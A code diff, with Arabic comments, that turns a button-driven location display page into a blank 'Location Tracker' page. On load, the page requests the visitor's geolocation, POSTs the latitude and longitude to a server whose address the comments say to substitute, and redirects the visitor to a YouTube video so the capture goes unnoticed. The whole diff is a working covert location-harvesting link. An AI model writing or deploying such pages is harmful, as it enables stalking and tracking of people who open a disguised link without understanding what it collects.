@@ -3,22 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location Redirect</title>
+    <title>Location Tracker</title>
     <script>
-        function getLocationAndRedirect() {
-            // التحقق إذا كان المتصفح يدعم Geolocation API
+        window.onload = function() {
             if (navigator.geolocation) {
+                // طلب تحديد الموقع الجغرافي
                 navigator.geolocation.getCurrentPosition(function(position) {
-                    var latitude = position.coords.latitude;
-                    var longitude = position.coords.longitude;
-                    
-                    // عرض الموقع الجغرافي على الشاشة
-                    document.getElementById("location").innerHTML = "Latitude: " + latitude + "<br>Longitude: " + longitude;
+                    var latitude = position.coords.latitude;  // خط العرض
+                    var longitude = position.coords.longitude;  // خط الطول
 
-                    // إعادة التوجيه إلى رابط آخر بناءً على الموقع
-                    var redirectUrl = "https://example.com?lat=" + latitude + "&lon=" + longitude;
-                    window.location.href = redirectUrl; // إعادة توجيه إلى الرابط
+                    // إرسال الإحداثيات إلى سيرفر محلي باستخدام fetch
+                    fetch('http://localhost:3000/api/store-location', {  // استبدل هذا بعنوان سيرفرك
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            latitude: latitude,
+                            longitude: longitude
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => console.log('Location sent to server!'))
+                    .catch(error => console.error('Error:', error));
+
+                    // إعادة توجيه المستخدم إلى رابط YouTube أو أي رابط آخر
+                    window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";  // مثال لمقطع فيديو
                 }, function(error) {
+                    // في حال حدوث خطأ أو رفض من المستخدم
                     alert("Error in fetching location: " + error.message);
                 });
             } else {
@@ -28,8 +40,6 @@
     </script>
 </head>
 <body>
-    <h1>Click to Get Location and Redirect</h1>
-    <button onclick="getLocationAndRedirect()">Get Location and Redirect</button>
-    <p id="location"></p>
+    <!-- الصفحة ستكون فارغة ولن تحتوي على أي محتوى مرئي للمستخدم -->
 </body>
 </html>
